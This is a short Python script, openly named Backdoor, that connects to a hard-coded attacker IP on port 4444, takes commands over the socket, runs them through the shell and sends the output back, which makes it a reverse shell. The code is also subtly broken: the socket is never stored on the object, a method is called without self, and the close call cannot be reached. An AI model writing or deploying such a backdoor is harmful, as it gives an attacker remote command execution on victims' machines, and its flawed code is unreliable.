import socket
import subprocess



class Backdoor:
    
    def __init__(self, attacker_ip, port):
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((attacker_ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):

        while True:
            command = connection.recv(1024).decode('utf-8')
            
            result = execute_system_command(command)
            connection.send(result)

        connection.close()

attacker_ip = "192.168.106.129"

bd = Backdoor(attacker_ip, 4444)
bd.run()
